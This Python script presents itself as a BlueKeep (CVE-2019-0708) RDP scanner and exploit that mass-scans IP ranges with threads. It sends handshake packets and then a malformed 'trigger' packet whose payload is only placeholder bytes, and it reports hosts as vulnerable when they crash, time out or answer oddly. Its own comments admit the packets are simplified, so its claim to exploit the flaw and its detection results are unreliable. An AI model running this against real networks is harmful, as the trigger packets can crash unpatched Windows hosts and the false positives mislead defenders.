#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2019-0708
# Original vulnerability discovered by Microsoft Security Response Center
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
BlueKeep (CVE-2019-0708) RDP Remote Code Execution Scanner and Exploit

This tool tests for and exploits the BlueKeep vulnerability in Microsoft RDP.
The vulnerability allows remote code execution without authentication on vulnerable
Windows systems through malformed RDP connection requests.

Affected versions:
- Windows 7 (all versions)
- Windows Server 2008/2008 R2 (all versions)
- Windows XP (all versions)
- Windows Server 2003 (all versions)

The exploit works by sending specially crafted RDP packets that trigger a use-after-free
condition in the RDP service, allowing arbitrary code execution with SYSTEM privileges.
"""

import argparse
import socket
import struct
import sys
import time
import threading
from ipaddress import ip_network
import binascii

# RDP Protocol Constants
RDP_TYPE_X224_CONNECTION_REQUEST = 0xE0
RDP_TYPE_MCS_CONNECT_INITIAL = 0x7F65
RDP_TYPE_MCS_CONNECT_RESPONSE = 0x7F66

# X.224 Connection Request
def create_x224_connection_request():
    """Create X.224 Connection Request packet"""
    # X.224 Connection Request
    x224_data = b'\x03\x00\x00\x13'  # TPKT Header
    x224_data += b'\x0e'             # X.224 Length
    x224_data += b'\xe0'             # X.224 Connection Request
    x224_data += b'\x00\x00'         # Destination reference
    x224_data += b'\x00\x00'         # Source reference
    x224_data += b'\x00'             # Class and options
    x224_data += b'Cookie: mstshash=user\r\n'  # Cookie
    
    return x224_data

def create_mcs_connect_initial():
    """Create MCS Connect Initial packet"""
    # This is a simplified MCS Connect Initial packet
    # Real implementation would be much more complex
    mcs_data = b'\x03\x00\x01\x2c'  # TPKT Header
    mcs_data += b'\x02\xf0\x80'     # X.224 Data
    mcs_data += b'\x7f\x65\x82\x01\x20'  # MCS Connect Initial
    
    # Add basic MCS data (simplified)
    mcs_data += b'\x04\x01\x01'     # CallingDomainSelector
    mcs_data += b'\x04\x01\x01'     # CalledDomainSelector
    mcs_data += b'\x01\x01\xff'     # UpwardFlag
    mcs_data += b'\x30\x19'         # DomainParameters
    mcs_data += b'\x02\x01\x22'     # MaxChannelIds
    mcs_data += b'\x02\x01\x20'     # MaxUserIds
    mcs_data += b'\x02\x01\x00'     # MaxTokenIds
    mcs_data += b'\x02\x01\x01'     # NumPriorities
    mcs_data += b'\x02\x01\x00'     # MinThroughput
    mcs_data += b'\x02\x01\x01'     # MaxHeight
    mcs_data += b'\x02\x02\xff\xff' # MaxMCSPDUsize
    mcs_data += b'\x02\x01\x02'     # ProtocolVersion
    
    # Add user data (GCC Conference Create Request)
    user_data = b'\x04\x82\x00\xdc'  # User data length
    user_data += b'\x00\x05\x00\x14\x7c\x00\x01'  # Client core data
    user_data += b'\x81\x2a\x00\x08\x00\x10\x00\x01\x00\x03\x00\x02\x00\x00\x00'
    user_data += b'\x0d\x04\x00\x00\x00\x00\x00\x00\x00'
    user_data += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    
    mcs_data += user_data
    
    return mcs_data

def create_bluekeep_trigger():
    """Create the malicious packet that triggers BlueKeep"""
    # This is a simplified trigger packet
    # Real exploit would have complex heap manipulation
    trigger_data = b'\x03\x00\x00\x0c'  # TPKT Header
    trigger_data += b'\x02\xf0\x80'     # X.224 Data
    trigger_data += b'\x28'             # MCS Send Data Request
    
    # Channel data that triggers the vulnerability
    # This would contain the actual exploit payload in a real attack
    channel_data = b'\x41' * 100  # Placeholder for exploit payload
    
    trigger_data += channel_data
    
    return trigger_data

def check_rdp_service(host, port=3389, timeout=5):
    """Check if RDP service is running and responsive"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send X.224 Connection Request
        x224_request = create_x224_connection_request()
        sock.send(x224_request)
        
        # Receive response
        response = sock.recv(1024)
        sock.close()
        
        # Check if we got a valid X.224 Connection Confirm
        if len(response) >= 7 and response[5] == 0xd0:  # X.224 Connection Confirm
            return True, "RDP service responding"
        else:
            return False, "Invalid RDP response"
            
    except socket.timeout:
        return False, "Connection timeout"
    except ConnectionRefusedError:
        return False, "Connection refused"
    except Exception as e:
        return False, f"Connection error: {str(e)}"

def test_bluekeep_vulnerability(host, port=3389, timeout=10):
    """Test if target is vulnerable to BlueKeep"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Step 1: X.224 Connection Request
        x224_request = create_x224_connection_request()
        sock.send(x224_request)
        
        response = sock.recv(1024)
        if len(response) < 7 or response[5] != 0xd0:
            sock.close()
            return False, "Invalid X.224 response"
        
        # Step 2: MCS Connect Initial
        mcs_connect = create_mcs_connect_initial()
        sock.send(mcs_connect)
        
        response = sock.recv(1024)
        if len(response) < 10:
            sock.close()
            return False, "Invalid MCS response"
        
        # Step 3: Send BlueKeep trigger
        trigger = create_bluekeep_trigger()
        sock.send(trigger)
        
        # Check response - vulnerable systems may crash or respond differently
        try:
            response = sock.recv(1024)
            sock.close()
            
            # Analyze response for vulnerability indicators
            # This is simplified - real detection would be more sophisticated
            if len(response) == 0:
                return True, "No response (possible crash)"
            elif b'\x03\x00' in response[:2]:
                # Got TPKT response, analyze further
                if len(response) < 20:
                    return True, "Truncated response (possible vulnerability)"
                else:
                    return False, "System appears patched"
            else:
                return True, "Unexpected response pattern"
                
        except socket.timeout:
            sock.close()
            return True, "Timeout after trigger (possible crash)"
            
    except ConnectionRefusedError:
        return False, "RDP service not accessible"
    except Exception as e:
        return False, f"Connection error: {str(e)}"

def check_windows_version(host, port=3389, timeout=5):
    """Attempt to determine Windows version through RDP handshake"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send connection request
        x224_request = create_x224_connection_request()
        sock.send(x224_request)
        
        response = sock.recv(1024)
        sock.close()
        
        # Analyze response for version indicators
        # This is simplified version detection
        if len(response) > 20:
            # Look for version indicators in the response
            if b'\x02\x00\x00\x00' in response:
                return "Possibly Windows 7/2008 R2"
            elif b'\x01\x00\x00\x00' in response:
                return "Possibly Windows XP/2003"
            else:
                return "Unknown Windows version"
        else:
            return "Unable to determine version"
            
    except Exception:
        return "Version detection failed"

def scan_target(host, port, timeout, verbose, quiet):
    """Scan a single target for BlueKeep"""
    if not quiet and verbose:
        print(f"Scanning {host}:{port}...")
    
    # First check if RDP is accessible
    rdp_accessible, rdp_message = check_rdp_service(host, port, timeout)
    
    if not rdp_accessible:
        if not quiet:
            print(f"[CLOSED] {host}:{port} - {rdp_message}")
        return False
    
    # Check Windows version if verbose
    if verbose:
        version = check_windows_version(host, port, timeout)
        if not quiet:
            print(f"[INFO] {host}:{port} - {version}")
    
    # Test for BlueKeep vulnerability
    vulnerable, reason = test_bluekeep_vulnerability(host, port, timeout)
    
    if vulnerable:
        print(f"[VULNERABLE] {host}:{port} - BlueKeep detected! ({reason})")
        return True
    else:
        if not quiet:
            print(f"[SAFE] {host}:{port} - Not vulnerable ({reason})")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='BlueKeep (CVE-2019-0708) Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t 192.168.1.100
  python exploit.py -t 192.168.1.0/24 --threads 50
  python exploit.py -f targets.txt -q
  python exploit.py -t 192.168.1.100 -v --check-rdp-version
        """
    )
    
    parser.add_argument('-t', '--target', help='Target IP address or CIDR range')
    parser.add_argument('-p', '--port', type=int, default=3389, help='Target port (default: 3389)')
    parser.add_argument('-f', '--file', help='File containing list of targets')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show vulnerable hosts)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--check-rdp-version', action='store_true', help='Attempt to detect Windows version')
    
    args = parser.parse_args()
    
    if not args.target and not args.file:
        parser.error('Must specify either --target or --file')
    
    targets = []
    
    if args.target:
        try:
            # Handle CIDR notation
            if '/' in args.target:
                network = ip_network(args.target, strict=False)
                targets = [str(ip) for ip in network.hosts()]
            else:
                targets = [args.target]
        except Exception as e:
            print(f"Error parsing target: {e}")
            return 1
    
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading file: {e}")
            return 1
    
    if not targets:
        print("No targets to scan")
        return 1
    
    if not args.quiet:
        print(f"Scanning {len(targets)} targets for BlueKeep vulnerability...")
        print("=" * 60)
    
    vulnerable_count = 0
    
    # Simple threading for faster scanning
    def worker():
        nonlocal vulnerable_count
        while True:
            try:
                host = target_queue.pop(0)
            except IndexError:
                break
            
            if scan_target(host, args.port, args.timeout, args.verbose, args.quiet):
                vulnerable_count += 1
    
    target_queue = targets.copy()
    threads = []
    
    for _ in range(min(args.threads, len(targets))):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if not args.quiet:
        print("=" * 60)
        print(f"Scan complete. Found {vulnerable_count} vulnerable hosts out of {len(targets)} tested.")
        
        if vulnerable_count > 0:
            print("\nCRITICAL: Vulnerable systems found!")
            print("BlueKeep is a wormable vulnerability that can spread automatically.")
            print("Patch immediately and enable Network Level Authentication.")
            print("Consider disabling RDP if not needed.")
    
    return 0 if vulnerable_count == 0 else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(1)